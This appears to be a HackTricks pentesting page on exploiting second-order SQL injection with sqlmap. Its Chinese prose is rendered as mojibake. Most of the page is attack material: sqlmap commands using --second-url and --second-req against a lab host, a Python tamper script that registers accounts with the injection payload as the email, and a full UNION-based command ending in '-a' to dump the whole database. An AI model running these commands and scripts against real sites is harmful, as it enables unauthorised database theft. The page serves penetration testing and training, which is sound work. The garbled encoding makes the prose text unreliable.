{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}


**SQLMap å¯ä»¥åˆ©ç”¨äºŒæ¬¡ SQL æ³¨å…¥ã€‚**\
æ‚¨éœ€è¦æä¾›ï¼š

* **è¯·æ±‚**ï¼Œå…¶ä¸­å°†ä¿å­˜ **sqlinjection è´Ÿè½½**
* **è¯·æ±‚**ï¼Œå…¶ä¸­ **è´Ÿè½½** å°†è¢« **æ‰§è¡Œ**

ä¿å­˜ SQL æ³¨å…¥è´Ÿè½½çš„è¯·æ±‚ **ä¸ sqlmap ä¸­çš„ä»»ä½•å…¶ä»–æ³¨å…¥ä¸€æ ·æŒ‡ç¤º**ã€‚å¯ä»¥ä½¿ç”¨ `--second-url` æˆ– `--second-req` æŒ‡ç¤º **sqlmap å¯ä»¥è¯»å–æ³¨å…¥çš„è¾“å‡º/æ‰§è¡Œ** çš„è¯·æ±‚ï¼Œå¦‚æœæ‚¨éœ€è¦ä»æ–‡ä»¶ä¸­æŒ‡ç¤ºå®Œæ•´è¯·æ±‚ã€‚

**ç®€å•çš„äºŒæ¬¡æ³¨å…¥ç¤ºä¾‹ï¼š**
```bash
#Get the SQL payload execution with a GET to a url
sqlmap -r login.txt -p username --second-url "http://10.10.10.10/details.php"

#Get the SQL payload execution sending a custom request from a file
sqlmap -r login.txt -p username --second-req details.txt
```
åœ¨å‡ ä¸ªæƒ…å†µä¸‹ **è¿™å°†ä¸å¤Ÿ**ï¼Œå› ä¸ºä½ éœ€è¦ **æ‰§è¡Œå…¶ä»–æ“ä½œ**ï¼Œé™¤äº†å‘é€æœ‰æ•ˆè´Ÿè½½å’Œè®¿é—®ä¸åŒçš„é¡µé¢ã€‚

å½“éœ€è¦è¿™æ ·åšæ—¶ï¼Œä½ å¯ä»¥ä½¿ç”¨ **sqlmap tamper**ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹è„šæœ¬å°†æ³¨å†Œä¸€ä¸ªæ–°ç”¨æˆ· **ä½¿ç”¨ sqlmap æœ‰æ•ˆè´Ÿè½½ä½œä¸ºç”µå­é‚®ä»¶** å¹¶æ³¨é”€ã€‚
```python
#!/usr/bin/env python

import re
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
pass

def login_account(payload):
proxies = {'http':'http://127.0.0.1:8080'}
cookies = {"PHPSESSID": "6laafab1f6om5rqjsbvhmq9mf2"}

params = {"username":"asdasdasd", "email":payload, "password":"11111111"}
url = "http://10.10.10.10/create.php"
pr = requests.post(url, data=params, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

url = "http://10.10.10.10/exit.php"
pr = requests.get(url, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

def tamper(payload, **kwargs):
headers = kwargs.get("headers", {})
login_account(payload)
return payload
```
ä¸€ä¸ª **SQLMap tamper æ€»æ˜¯åœ¨å¼€å§‹æ³¨å…¥å°è¯•ä¹‹å‰æ‰§è¡Œï¼Œå¹¶ä¸”å¿…é¡»è¿”å›ä¸€ä¸ªæœ‰æ•ˆè´Ÿè½½**ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¸å…³å¿ƒæœ‰æ•ˆè´Ÿè½½ï¼Œä½†æˆ‘ä»¬å…³å¿ƒå‘é€ä¸€äº›è¯·æ±‚ï¼Œå› æ­¤æœ‰æ•ˆè´Ÿè½½æ²¡æœ‰æ”¹å˜ã€‚

å› æ­¤ï¼Œå¦‚æœå‡ºäºæŸç§åŸå› ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ›´å¤æ‚çš„æµç¨‹æ¥åˆ©ç”¨äºŒæ¬¡ SQL æ³¨å…¥ï¼Œä¾‹å¦‚ï¼š

* åœ¨â€œç”µå­é‚®ä»¶â€å­—æ®µä¸­åˆ›å»ºä¸€ä¸ªåŒ…å« SQLi æœ‰æ•ˆè´Ÿè½½çš„å¸æˆ·
* ç™»å‡º
* ä½¿ç”¨è¯¥å¸æˆ·ç™»å½• (login.txt)
* å‘é€è¯·æ±‚ä»¥æ‰§è¡Œ SQL æ³¨å…¥ (second.txt)

**è¿™æ¡ sqlmap å‘½ä»¤å°†æœ‰æ‰€å¸®åŠ©ï¼š**
```bash
sqlmap --tamper tamper.py -r login.txt -p email --second-req second.txt --proxy http://127.0.0.1:8080 --prefix "a2344r3F'" --technique=U --dbms mysql --union-char "DTEC" -a
##########
# --tamper tamper.py : Indicates the tamper to execute before trying each SQLipayload
# -r login.txt : Indicates the request to send the SQLi payload
# -p email : Focus on email parameter (you can do this with an "email=*" inside login.txt
# --second-req second.txt : Request to send to execute the SQLi and get the ouput
# --proxy http://127.0.0.1:8080 : Use this proxy
# --technique=U : Help sqlmap indicating the technique to use
# --dbms mysql : Help sqlmap indicating the dbms
# --prefix "a2344r3F'" : Help sqlmap detecting the injection indicating the prefix
# --union-char "DTEC" : Help sqlmap indicating a different union-char so it can identify the vuln
# -a : Dump all
```
{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
